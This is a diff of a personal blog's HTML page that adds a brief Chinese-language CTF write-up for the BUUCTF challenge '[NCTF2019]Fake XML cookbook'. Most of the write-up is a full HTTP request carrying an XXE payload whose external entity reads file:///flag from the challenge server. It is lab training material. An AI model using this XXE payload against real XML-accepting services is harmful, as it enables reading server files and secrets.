@@ -73,6 +73,54 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-20230611" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/06/11/20230611/" class="article-date">
+  <time class="dt-published" datetime="2023-06-11T15:21:59.000Z" itemprop="datePublished">2023-06-11</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/buuctf/">buuctf</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/06/11/20230611/">20230611</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><ol>
+<li><p>ctrl+u查看源代码,发现一段 js 代码</p>
+</li>
+<li><p>根据 js 代码的逻辑发现是XXE传入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /doLogin.php HTTP/1.1</span><br><span class="line">Host: 4a800570-8c38-437a-95a8-8a082d88d54c.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 153</span><br><span class="line">Accept: application/xml, text/xml, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36</span><br><span class="line">Content-Type: application/xml;charset=UTF-8</span><br><span class="line">Origin: http://4a800570-8c38-437a-95a8-8a082d88d54c.node4.buuoj.cn:81</span><br><span class="line">Referer: http://4a800570-8c38-437a-95a8-8a082d88d54c.node4.buuoj.cn:81/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE GVI [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/06/11/20230611/" data-id="clirkqqjq00006suzhbqldyro" data-title="20230611" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-SYCTF2023" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/06/11/SYCTF2023/" class="article-date">
@@ -901,6 +949,10 @@
       <ul>
         
           <li>
+            <a href="/2023/06/11/20230611/">20230611</a>
+          </li>
+        
+          <li>
             <a href="/2023/06/11/SYCTF2023/">SYCTF2023</a>
           </li>
         
@@ -914,10 +966,6 @@
         
           <li>
             <a href="/2023/06/01/web171-253/">web171-253</a>
-          </li>
-        
-          <li>
-            <a href="/2023/06/01/web1-web28/">Web1 - Web28</a>
           </li>
         
       </ul>
